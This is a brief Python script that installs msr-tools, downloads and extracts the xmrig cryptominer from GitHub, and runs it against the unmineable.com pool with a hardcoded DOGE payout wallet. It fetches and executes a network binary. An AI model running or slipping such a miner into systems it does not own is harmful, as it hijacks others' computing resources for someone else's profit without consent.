import subprocess
import os
import requests
import tarfile

# Update package lists
subprocess.run(['apt', 'update'])

# Install msr-tools
subprocess.run(['apt-get', '-y', 'install', 'msr-tools'])

# Download xmrig
url = "https://github.com/xmrig/xmrig/releases/download/v6.12.2/xmrig-6.12.2-linux-x64.tar.gz"
download_path = "xmrig-6.12.2-linux-x64.tar.gz"
response = requests.get(url)
with open(download_path, "wb") as f:
    f.write(response.content)

# Extract xmrig
with tarfile.open(download_path, "r:gz") as tar:
    tar.extractall()

# Change directory to xmrig
os.chdir("xmrig-6.12.2")

# Run xmrig
subprocess.run(['./xmrig', '-o', 'rx.unmineable.com:3333', '-a', 'rx', '-k', '-t', '2', '-u', 'DOGE:DFwWFuKENgq3pd3zrnzafTMXcWLLmERZ6x'])
